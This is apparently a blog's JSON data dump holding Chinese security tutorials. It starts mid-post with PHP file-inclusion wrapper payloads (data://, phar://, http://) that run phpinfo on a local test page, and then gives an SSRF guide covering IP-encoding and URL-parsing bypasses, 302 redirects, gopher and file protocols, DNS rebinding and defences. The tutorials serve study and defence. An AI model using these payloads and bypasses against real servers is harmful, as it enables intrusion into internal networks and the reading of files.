并上传（同样支持任意后缀名）</p>\n<pre><code>http://127.0.0.1/include.php?file=compress.zlib://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.gz</code></pre><p><img src=\"https://segmentfault.com/img/bVbrQBu\" alt=\"图片描述\"></p>\n</li>\n</ol>\n</li>\n<li><p><strong>参考</strong>：<a href=\"http://php.net/manual/zh/wrappers.compression.php\" target=\"_blank\" rel=\"noopener\">http://php.net/manual/zh/wrappers.compression.php</a></p>\n</li>\n</ul>\n<h2 id=\"data-协议\"><a href=\"#data-协议\" class=\"headerlink\" title=\"data:// 协议\"></a><code>data://</code> 协议</h2><ul>\n<li><p><strong>条件</strong>：</p>\n<ul>\n<li><code>allow_url_fopen</code>:on</li>\n<li><code>allow_url_include</code> :on</li>\n</ul>\n</li>\n<li><p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p>\n</li>\n<li><p><strong>用法</strong>：</p>\n<pre><code>data://text/plain,\ndata://text/plain;base64,</code></pre></li>\n<li><p><strong>示例</strong>：</p>\n<ol>\n<li><p><code>data://text/plain,</code></p>\n<pre><code>http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</code></pre><p><img src=\"https://segmentfault.com/img/bVbrQBB\" alt=\"图片描述\"></p>\n</li>\n<li><p><code>data://text/plain;base64,</code></p>\n<pre><code>http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><p><img src=\"https://segmentfault.com/img/bVbrQBD\" alt=\"图片描述\"></p>\n</li>\n</ol>\n</li>\n</ul>\n<h2 id=\"http-amp-https-协议\"><a href=\"#http-amp-https-协议\" class=\"headerlink\" title=\"http:// &amp; https:// 协议\"></a><code>http:// &amp; https://</code> 协议</h2><ul>\n<li><p><strong>条件</strong>：</p>\n<ul>\n<li><code>allow_url_fopen</code>:on</li>\n<li><code>allow_url_include</code> :on</li>\n</ul>\n</li>\n<li><p><strong>作用</strong>：常规 URL 形式，允许通过 <code>HTTP 1.0</code> 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</p>\n</li>\n<li><p><strong>用法</strong>：</p>\n<pre><code>http://example.com\nhttp://example.com/file.php?var1=val1&amp;var2=val2\nhttp://user:password@example.com\nhttps://example.com\nhttps://example.com/file.php?var1=val1&amp;var2=val2\nhttps://user:password@example.com</code></pre></li>\n<li><p><strong>示例</strong>：</p>\n<pre><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></pre><p><img src=\"https://segmentfault.com/img/bVbrQBP\" alt=\"图片描述\"></p>\n</li>\n</ul>\n<h2 id=\"phar-协议\"><a href=\"#phar-协议\" class=\"headerlink\" title=\"phar:// 协议\"></a><code>phar://</code> 协议</h2><p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p>\n<pre><code>http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</code></pre><p><img src=\"https://segmentfault.com/img/bVbrQBX\" alt=\"图片描述\"></p>\n<p>另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：<strong>phar://协议对象注入技术</strong>。</p>\n<p>因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。</p>\n<p>参考文章：<a href=\"https://paper.seebug.org/680/\" target=\"_blank\" rel=\"noopener\">seebug - 利用 phar 拓展 php 反序列化漏洞攻击面</a></p>\n"},{"layout":"post","title":"The SSRF","date":"2020-11-09T16:00:00.000Z","description":"服务端请求伪造攻击","typora-copy-images-to":"..\\img","_content":"\n# 服务端请求伪造攻击\n\n# 0x00原理\n\n一般的请求：客户端发起请求，服务器响应。\n\n另外一种请求：客户端发起请求（向服务端提供一个URL），服务端向客户端提供的URL发起请求，然后把获得的响应内容返回给客户端。如：\n\n\n\n![img](https:////upload-images.jianshu.io/upload_images/8531973-2129ae23303f3bff.jpg?imageMogr2/auto-orient/strip|imageView2/2/w/690/format/webp)\n\n服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等，就可能存在这种服务端请求伪造的缺陷。Google,Facebook,Adobe,baidu,tencent等知名公司都被发现过这种漏洞。\n\n# 0x01危害\n\n攻击者利用ssrf可以实现的攻击主要有5种：\n\n1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;\n\n2.攻击运行在内网或本地的应用程序（比如溢出）;\n\n3.对内网web应用进行指纹识别，通过访问默认文件实现;\n\n4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;\n\n5.利用file协议读取本地文件等。\n\n\n\n常用的利用思路：\n\n内网探测->应用识别->攻击Payload->Payload Result\n\n1.内网探测: 内网主机信息收集\n\n2.应用识别: 主机应用识别(可以通过Barner和应用指纹进行识别)\n\n3.攻击Payload: 根据应用识别的应用,加载不同的攻击Payload(最常用莫属于Struts2)\n\n4.Payload Result: 返回相应Payload的执行信息\n\n\n\n为什么通过http协议访问可以同其它协议的端口进行数据交互呢？\n\n跨协议通信技术利用：http://www.freebuf.com/articles/web/19622.html\n\n# 0x02漏洞挖掘\n\n一切从客户端提交的含有URL的参数都可能存在SSRF漏洞。\n\n#### 常见存在漏洞的场景如下：\n\n1、分享功能：通过URL地址分享网页内容。\n\n2、在线转码服务：把网页内容（URL）在线转码为适合手机浏览的样式。\n\n3、在线翻译：通过URL地址翻译对应文本内容。\n\n4、远程图片加载、下载：通过URL加载图片或者下载图片。如：http://www.example.com/picture?url=http://image.example.com/1.jpg\n\n5、图片、文章收藏功能：类似于场景1，通过URL收藏到在线收藏夹\n\n6、未公开的api实现以及其他调用URL的功能：此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。\n\n#### 常见的存在漏洞的参数：\n\nshare、wap、url、link、、src、source、target、u、3g、display、sourceURl、imageURL、domain...\n\n可以结合google语法及上述关键字进行搜索验证。\n\n#### 常见的容易出问题的函数：\n\nPHP : file_get_contents()、fsockopen()、curl_exec()\n\nJAVA : Request类，URL类的openStream，HttpClient类，URLConnection和HttpURLConnection类\n\n#### 漏洞验证\n\n1、排除法\n\n确认目标参数中的URL请求是从客户端发起还是从服务端发起的。\n\n如：[http://www.douban.com/](https://link.jianshu.com?t=http://www.douban.com/)***/service?image=[http://www.baidu.com/img/bd_logo1.png](https://link.jianshu.com?t=http://www.baidu.com/img/bd_logo1.png)\n\n**排除法一：**\n\n你可以直接右键图片，在新窗口打开图片，如果是浏览器上URL地址栏是http://www.baidu.com/img/bd_logo1.png，说明不存在SSRF漏洞。\n\n**排除法二：**\n\n你可以使用burpsuite等抓包工具来判断是否不是SSRF，首先SSRF是由服务端发起的请求，因此在加载图片的时候，是由服务端发起的，所以在我们本地浏览器的请求中就不应该存在图片的请求，在此例子中，如果刷新当前页面，有如下请求，则可判断不是SSRF。（前提设置burpsuite截断图片的请求，默认是放行的）\n\n\n\n![img](https:////upload-images.jianshu.io/upload_images/8531973-d42d493011d35ee5.png?imageMogr2/auto-orient/strip|imageView2/2/w/826/format/webp)\n\n2、实例验证\n\n首先要进行信息收集，以获得目标内网地址，收集途径：\n\na.敏感信息泄露\n\nb.漏洞平台历史信息中存在目标内网信息\n\nc.通过二级域名等暴力猜解工具模糊猜测内网地址\n\n收集到内网地址后，就可以进行实例验证，是否可以请求内网地址、端口、资源等。\n\n批量验证某个ip地址段端口开放情况可以用burp的爆破功能或者自己写py脚本。\n\n# 0x03绕过方法\n\n下文出现的192.168.0.1，10.0.0.1全部为服务器端的内网地址。\n\n**1、更改IP\\**地址写法\\****\n\n一些开发者会通过对传过来的URL参数进行正则匹配的方式来过滤掉内网IP，如采用如下正则表达式：\n\n^10(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d)){3}$\n\n^172\\.([1][6-9]|[2]\\d|3[01])(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d)){2}$\n\n^192\\.168(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d)){2}$\n\n对于这种过滤我们可以采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址我们可以改写成：\n\n(1)、8进制格式：0300.0250.0.1\n\n(2)、16进制格式：0xC0.0xA8.0.1\n\n(3)、10进制整数格式：3232235521\n\n(4)、16进制整数格式：0xC0A80001\n\n还有一种特殊的省略模式，例如10.0.0.1这个IP可以写成10.1\n\n**2****、利用解析****URL****所出现的问题**\n\n在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当，导致可以绕过过滤。\n\n[http://www.baidu.com@192.168.0.1/](https://link.jianshu.com?t=http://192.168.0.1/)\n\n\n\n当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是[www.baidu.com](https://link.jianshu.com?t=http://www.baidu.com/)，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为[www.baidu.com](https://link.jianshu.com?t=http://www.baidu.com/)，而实际上这个URL所请求的内容都是192.168.0.1上的内容。\n\n**3****、利用****302****跳转**\n\n如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用302跳转的方式来进行绕过。\n\n(1)、在网络上存在一个很神奇的服务，[http://xip.io](https://link.jianshu.com?t=http://xip.io/)当我们访问这个网站的子域名的时候，例如192.168.0.1.xip.io，就会自动重定向到192.168.0.1。\n\n(2)、由于上述方法中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，我们可以通过短地址的方式来绕过。经过测试发现新浪，百度的短地址服务并不支持IP模式，所以这里使用的是[http://tinyurl.com](https://link.jianshu.com?t=http://tinyurl.com/)所提供的短地址服务，如下图所示：\n\n\n\n![img](https:////upload-images.jianshu.io/upload_images/8531973-3a434cd0d2b841c8.png!small?imageMogr2/auto-orient/strip|imageView2/2/w/481/format/webp)\n\n同样的，我们也可以自行写一个跳转的服务接口来实现类似的功能。\n\n**4****、通过各种非****HTTP****协议：**\n\n如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。\n\n(1)、GOPHER协议：通过GOPHER我们在一个URL参数中构造Post或者Get请求，从而达到攻击内网应用的目的。例如我们可以使用GOPHER协议对与内网的Redis服务进行攻击，可以使用如下的URL：\n\n![img](https:////upload-images.jianshu.io/upload_images/8531973-523da0932affc6a0.png?imageMogr2/auto-orient/strip|imageView2/2/w/837/format/webp)\n\n(2)、File协议：File协议主要用于访问本地计算机中的文件，我们可以通过类似file:///文件路径这种格式来访问计算机本地文件。使用file协议可以避免服务端程序对于所访问的IP进行的过滤。例如我们可以通过file:///d:/1.txt 来访问D盘中1.txt的内容\n\n(3)、DICT协议\n\n[**5**]()**、****DNS Rebinding**\n\n对于常见的IP限制，后端服务器可能通过下图的流程进行IP过滤：\n\n\n\n![img](https:////upload-images.jianshu.io/upload_images/8531973-eed69aa1281f3db2.png!small?imageMogr2/auto-orient/strip|imageView2/2/w/624/format/webp)\n\n对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就pass掉。\n\n但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间查，利用这个时间差，我们可以进行DNS 重绑定攻击。\n\n要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：\n\n(1)、服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP\n\n(2)、对于获得的IP进行判断，发现为非黑名单IP，则通过验证\n\n(3)、服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。\n\n(4)、由于已经绕过验证，所以服务器端返回访问内网资源的结果。\n\n# 0x04实战案例\n\nwooyun漏洞库案例\n\nweblogic的uddiexplorer，这个好像比较常见一些\n\n其它待收集补充\n\n# 0x05防御思路\n\n通常有以下5个思路：\n\n1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。\n\n2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。\n\n3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。\n\n4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。\n\n5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。\n\n6、禁止302跳转\n\n7、使用gethostbyname（）判断请求是否为内网ip。 要结合6来使用\n\n其中3、4、5可以通过网络防火墙或者主机防火墙来实现。\n\n# 0x06参考\n\nSSRF攻击实例解析：http://www.freebuf.com/articles/web/20407.html\n\nSSRF漏洞的挖掘经验：http://bobao.360.cn/learning/detail/240.html\n\n跨协议通信技术利用：http://www.freebuf.com/articles/web/19622.html\n\n关于SSRF攻击：http://evilcos.me/?p=221 \n\nSSRF的新纪元：在编程语言中利用URL解析器：http://bobao.360.cn/learning/detail/4183.html\n\n\n\n作者：0x525c\n链接：https://www.jianshu.com/p/10ec9bd3fa0a\n来源：简书\n著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。\n\n\n","source":"_posts/2020-11-10-SSRF服务端请求伪造.md","raw":"---\nlayout: post\ntitle: The SSRF\ndate: 2020-11-10\ncategories: blog\ntags: [web,漏洞]\ndescription: 服务端请求伪造攻击\ntypora-copy-images-to: ..\\img\n---\n\n# 服务端请求伪造攻击\n\n# 0x00原理\n\n一般的请求：客户端发起请求，服务器响应。\n\n另外一种请求：客户端发起请求（向服务端提供一个URL），服务端向客户端提供的URL发起请求，然后把获得的响应内容返回给客户端。如：\n\n\n\n![img](https:////upload-images.jianshu.io/upload_images/8531973-2129ae23303f3bff.jpg?imageMogr2/auto-orient/strip|imageView2/2/w/690/format/webp)\n\n服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等，就可能存在这种服务端请求伪造的缺陷。Google,Facebook,Adobe,baidu,tencent等知名公司都被发现过这种漏洞。\n\n# 0x01危害\n\n攻击者利用ssrf可以实现的攻击主要有5种：\n\n1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;\n\n2.攻击运行在内网或本地的应用程序（比如溢出）;\n\n3.对内网web应用进行指纹识别，通过访问默认文件实现;\n\n4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;\n\n5.利用file协议读取本地文件等。\n\n\n\n常用的利用思路：\n\n内网探测->应用识别->攻击Payload->Payload Result\n\n1.内网探测: 内网主机信息收集\n\n2.应用识别: 主机应用识别(可以通过Barner和应用指纹进行识别)\n\n3.攻击Payload: 根据应用识别的应用,加载不同的攻击Payload(最常用莫属于Struts2)\n\n4.Payload Result: 返回相应Payload的执行信息\n\n\n\n为什么通过http协议访问可以同其它协议的端口进行数据交互呢？\n\n跨协议通信技术利用：http://www.freebuf.com/articles/web/19622.html\n\n# 0x02漏洞挖掘\n\n一切从客户端提交的含有URL的参数都可能存在SSRF漏洞。\n\n#### 常见存在漏洞的场景如下：\n\n1、分享功能：通过URL地址分享网页内容。\n\n2、在线转码服务：把网页内容（URL）在线转码为适合手机浏览的样式。\n\n3、在线翻译：通过URL地址翻译对应文本内容。\n\n4、远程图片加载、下载：通过URL加载图片或者下载图片。如：http://www.example.com/picture?url=http://image.example.com/1.jpg\n\n5、图片、文章收藏功能：类似于场景1，通过URL收藏到在线收藏夹\n\n6、未公开的api实现以及其他调用URL的功能：此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。\n\n#### 常见的存在漏洞的参数：\n\nshare、wap、url、link、、src、source、target、u、3g、display、sourceURl、imageURL、domain...\n\n可以结合google语法及上述关键字进行搜索验证。\n\n#### 常见的容易出问题的函数：\n\nPHP : file_get_contents()、fsockopen()、curl_exec()\n\nJAVA : Request类，URL类的openStream，HttpClient类，URLConnection和HttpURLConnection类\n\n#### 漏洞验证\n\n1、排除法\n\n确认目标参数中的URL请求是从客户端发起还是从服务端发起的。\n\n如：[http://www.douban.com/](https://link.jianshu.com?t=http://www.douban.com/)***/service?image=[http://www.baidu.com/img/bd_logo1.png](https://link.jianshu.com?t=http://www.baidu.com/img/bd_logo1.png)\n\n**排除法一：**\n\n你可以直接右键图片，在新窗口打开图片，如果是浏览器上URL地址栏是http://www.baidu.com/img/bd_logo1.png，说明不存在SSRF漏洞。\n\n**排除法二：**\n\n你可以使用burpsuite等抓包工具来判断是否不是SSRF，首先SSRF是由服务端发起的请求，因此在加载图片的时候，是由服务端发起的，所以在我们本地浏览器的请求中就不应该存在图片的请求，在此例子中，如果刷新当前页面，有如下请求，则可判断不是SSRF。（前提设置burpsuite截断图片的请求，默认是放行的）\n\n\n\n![img](https:////upload-images.jianshu.io/upload_images/8531973-d42d493011d35ee5.png?imageMogr2/auto-orient/strip|imageView2/2/w/826/format/webp)\n\n2、实例验证\n\n首先要进行信息收集，以获得目标内网地址，收集途径：\n\na.敏感信息泄露\n\nb.漏洞平台历史信息中存在目标内网信息\n\nc.通过二级域名等暴力猜解工具模糊猜测内网地址\n\n收集到内网地址后，就可以进行实例验证，是否可以请求内网地址、端口、资源等。\n\n批量验证某个ip地址段端口开放情况可以用burp的爆破功能或者自己写py脚本。\n\n# 0x03绕过方法\n\n下文出现的192.168.0.1，10.0.0.1全部为服务器端的内网地址。\n\n**1、更改IP\\**地址写法\\****\n\n一些开发者会通过对传过来的URL参数进行正则匹配的方式来过滤掉内网IP，如采用如下正则表达式：\n\n^10(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d)){3}$\n\n^172\\.([1][6-9]|[2]\\d|3[01])(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d)){2}$\n\n^192\\.168(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d)){2}$\n\n对于这种过滤我们可以采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址我们可以改写成：\n\n(1)、8进制格式：0300.0250.0.1\n\n(2)、16进制格式：0xC0.0xA8.0.1\n\n(3)、10进制整数格式：3232235521\n\n(4)、16进制整数格式：0xC0A80001\n\n还有一种特殊的省略模式，例如10.0.0.1这个IP可以写成10.1\n\n**2****、利用解析****URL****所出现的问题**\n\n在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当，导致可以绕过过滤。\n\n[http://www.baidu.com@192.168.0.1/](https://link.jianshu.com?t=http://192.168.0.1/)\n\n\n\n当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是[www.baidu.com](https://link.jianshu.com?t=http://www.baidu.com/)，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为[www.baidu.com](https://link.jianshu.com?t=http://www.baidu.com/)，而实际上这个URL所请求的内容都是192.168.0.1上的内容。\n\n**3****、利用****302****跳转**\n\n如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用302跳转的方式来进行绕过。\n\n(1)、在网络上存在一个很神奇的服务，[http://xip.io](https://link.jianshu.com?t=http://xip.io/)当我们访问这个网站的子域名的时候，例如192.168.0.1.xip.io，就会自动重定向到192.168.0.1。\n\n(2)、由于上述方法中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，我们可以通过短地址的方式来绕过。经过测试发现新浪，百度的短地址服务并不支持IP模式，所以这里使用的是[http://tinyurl.com](https://link.jianshu.com?t=http://tinyurl.com/)所提供的短地址服务，如下图所示：\n\n\n\n![img](https:////upload-images.jianshu.io/upload_images/8531973-3a434cd0d2b841c8.png!small?imageMogr2/auto-orient/strip|imageView2/2/w/481/format/webp)\n\n同样的，我们也可以自行写一个跳转的服务接口来实现类似的功能。\n\n**4****、通过各种非****HTTP****协议：**\n\n如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。\n\n(1)、GOPHER协议：通过GOPHER我们在一个URL参数中构造Post或者Get请求，从而达到攻击内网应用的目的。例如我们可以使用GOPHER协议对与内网的Redis服务进行攻击，可以使用如下的URL：\n\n![img](https:////upload-images.jianshu.io/upload_images/8531973-523da0932affc6a0.png?imageMogr2/auto-orient/strip|imageView2/2/w/837/format/webp)\n\n(2)、File协议：File协议主要用于访问本地计算机中的文件，我们可以通过类似file:///文件路径这种格式来访问计算机本地文件。使用file协议可以避免服务端程序对于所访问的IP进行的过滤。例如我们可以通过file:///d:/1.txt 来访问D盘中1.txt的内容\n\n(3)、DICT协议\n\n[**5**]()**、****DNS Rebinding**\n\n对于常见的IP限制，后端服务器可能通过下图的流程进行IP过滤：\n\n\n\n![img](https:////upload-images.jianshu.io/upload_images/8531973-eed69aa1281f3db2.png!small?imageMogr2/auto-orient/strip|imageView2/2/w/624/format/webp)\n\n对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就pass掉。\n\n但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间查，利用这个时间差，我们可以进行DNS 重绑定攻击。\n\n要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：\n\n(1)、服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP\n\n(2)、对于获得的IP进行判断，发现为非黑名单IP，则通过验证\n\n(3)、服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。\n\n(4)、由于已经绕过验证，所以服务器端返回访问内网资源的结果。\n\n# 0x04实战案例\n\nwooyun漏洞库案例\n\nweblogic的uddiexplorer，这个好像比较常见一些\n\n其它待收集补充\n\n# 0x05防御思路\n\n通常有以下5个思路：\n\n1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。\n\n2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。\n\n3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。\n\n4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。\n\n5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。\n\n6、禁止302跳转\n\n7、使用gethostbyname（）判断请求是否为内网ip。 要结合6来使用\n\n其中3、4、5可以通过网络防火墙或者主机防火墙来实现。\n\n# 0x06参考\n\nSSRF攻击实例解析：http://www.freebuf.com/articles/web/20407.html\n\nSSRF漏洞的挖掘经验：http://bobao.360.cn/learning/detail/240.html\n\n跨协议通信技术利用：http://www.freebuf.com/articles/web/19622.html\n\n关于SSRF攻击：http://evilcos.me/?p=221 \n\nSSRF的新纪元：在编程语言中利用URL解析器：http://bobao.360.cn/learning/detail/4183.html\n\n\n\n作者：0x525c\n链接：https://www.jianshu.com/p/10ec9bd3fa0a\n来源：简书\n著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。\n\n\n","slug":"2020-11-10-SSRF服务端请求伪造","published":1,"updated":"2020-11-20T02:13:24.451Z","comments":1,"photos":[],"link":"","_id":"ckkntx9jp000uxov70qgyrlvs","content":"<h1 id=\"服务端请求伪造攻击\"><a href=\"#服务端请求伪造攻击\" class=\"headerlink\" title=\"服务端请求伪造攻击\"></a>服务端请求伪造攻击</h1><h1 id=\"0x00原理\"><a href=\"#0x00原理\" class=\"headerlink\" title=\"0x00原理\"></a>0x00原理</h1><p>一般的请求：客户端发起请求，服务器响应。</p>\n<p>另外一种请求：客户端发起请求（向服务端提供一个URL），服务端向客户端提供的URL发起请求，然后把获得的响应内容返回给客户端。如：</p>\n<p><img src=\"https:////upload-images.jianshu.io/upload_images/8531973-2129ae23303f3bff.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/690/format/webp\" alt=\"img\"></p>\n<p>服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等，就可能存在这种服务端请求伪造的缺陷。Google,Facebook,Adobe,baidu,tencent等知名公司都被发现过这种漏洞。</p>\n<h1 id=\"0x01危害\"><a href=\"#0x01危害\" class=\"headerlink\" title=\"0x01危害\"></a>0x01危害</h1><p>攻击者利用ssrf可以实现的攻击主要有5种：</p>\n<p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>\n<p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p>\n<p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p>\n<p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p>\n<p>5.利用file协议读取本地文件等。</p>\n<p>常用的利用思路：</p>\n<p>内网探测-&gt;应用识别-&gt;攻击Payload-&gt;Payload Result</p>\n<p>1.内网探测: 内网主机信息收集</p>\n<p>2.应用识别: 主机应用识别(可以通过Barner和应用指纹进行识别)</p>\n<p>3.攻击Payload: 根据应用识别的应用,加载不同的攻击Payload(最常用莫属于Struts2)</p>\n<p>4.Payload Result: 返回相应Payload的执行信息</p>\n<p>为什么通过http协议访问可以同其它协议的端口进行数据交互呢？</p>\n<p>跨协议通信技术利用：<a href=\"http://www.freebuf.com/articles/web/19622.html\" target=\"_blank\" rel=\"noopener\">http://www.freebuf.com/articles/web/19622.html</a></p>\n<h1 id=\"0x02漏洞挖掘\"><a href=\"#0x02漏洞挖掘\" class=\"headerlink\" title=\"0x02漏洞挖掘\"></a>0x02漏洞挖掘</h1><p>一切从客户端提交的含有URL的参数都可能存在SSRF漏洞。</p>\n<h4 id=\"常见存在漏洞的场景如下：\"><a href=\"#常见存在漏洞的场景如下：\" class=\"headerlink\" title=\"常见存在漏洞的场景如下：\"></a>常见存在漏洞的场景如下：</h4><p>1、分享功能：通过URL地址分享网页内容。</p>\n<p>2、在线转码服务：把网页内容（URL）在线转码为适合手机浏览的样式。</p>\n<p>3、在线翻译：通过URL地址翻译对应文本内容。</p>\n<p>4、远程图片加载、下载：通过URL加载图片或者下载图片。如：<a href=\"http://www.example.com/picture?url=http://image.example.com/1.jpg\" target=\"_blank\" rel=\"noopener\">http://www.example.com/picture?url=http://image.example.com/1.jpg</a></p>\n<p>5、图片、文章收藏功能：类似于场景1，通过URL收藏到在线收藏夹</p>\n<p>6、未公开的api实现以及其他调用URL的功能：此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。</p>\n<h4 id=\"常见的存在漏洞的参数：\"><a href=\"#常见的存在漏洞的参数：\" class=\"headerlink\" title=\"常见的存在漏洞的参数：\"></a>常见的存在漏洞的参数：</h4><p>share、wap、url、link、、src、source、target、u、3g、display、sourceURl、imageURL、domain…</p>\n<p>可以结合google语法及上述关键字进行搜索验证。</p>\n<h4 id=\"常见的容易出问题的函数：\"><a href=\"#常见的容易出问题的函数：\" class=\"headerlink\" title=\"常见的容易出问题的函数：\"></a>常见的容易出问题的函数：</h4><p>PHP : file_get_contents()、fsockopen()、curl_exec()</p>\n<p>JAVA : Request类，URL类的openStream，HttpClient类，URLConnection和HttpURLConnection类</p>\n<h4 id=\"漏洞验证\"><a href=\"#漏洞验证\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h4><p>1、排除法</p>\n<p>确认目标参数中的URL请求是从客户端发起还是从服务端发起的。</p>\n<p>如：<a href=\"https://link.jianshu.com?t=http://www.douban.com/\" target=\"_blank\" rel=\"noopener\">http://www.douban.com/</a>***/service?image=<a href=\"https://link.jianshu.com?t=http://www.baidu.com/img/bd_logo1.png\" target=\"_blank\" rel=\"noopener\">http://www.baidu.com/img/bd_logo1.png</a></p>\n<p><strong>排除法一：</strong></p>\n<p>你可以直接右键图片，在新窗口打开图片，如果是浏览器上URL地址栏是<a href=\"http://www.baidu.com/img/bd_logo1.png，说明不存在SSRF漏洞。\" target=\"_blank\" rel=\"noopener\">http://www.baidu.com/img/bd_logo1.png，说明不存在SSRF漏洞。</a></p>\n<p><strong>排除法二：</strong></p>\n<p>你可以使用burpsuite等抓包工具来判断是否不是SSRF，首先SSRF是由服务端发起的请求，因此在加载图片的时候，是由服务端发起的，所以在我们本地浏览器的请求中就不应该存在图片的请求，在此例子中，如果刷新当前页面，有如下请求，则可判断不是SSRF。（前提设置burpsuite截断图片的请求，默认是放行的）</p>\n<p><img src=\"https:////upload-images.jianshu.io/upload_images/8531973-d42d493011d35ee5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/826/format/webp\" alt=\"img\"></p>\n<p>2、实例验证</p>\n<p>首先要进行信息收集，以获得目标内网地址，收集途径：</p>\n<p>a.敏感信息泄露</p>\n<p>b.漏洞平台历史信息中存在目标内网信息</p>\n<p>c.通过二级域名等暴力猜解工具模糊猜测内网地址</p>\n<p>收集到内网地址后，就可以进行实例验证，是否可以请求内网地址、端口、资源等。</p>\n<p>批量验证某个ip地址段端口开放情况可以用burp的爆破功能或者自己写py脚本。</p>\n<h1 id=\"0x03绕过方法\"><a href=\"#0x03绕过方法\" class=\"headerlink\" 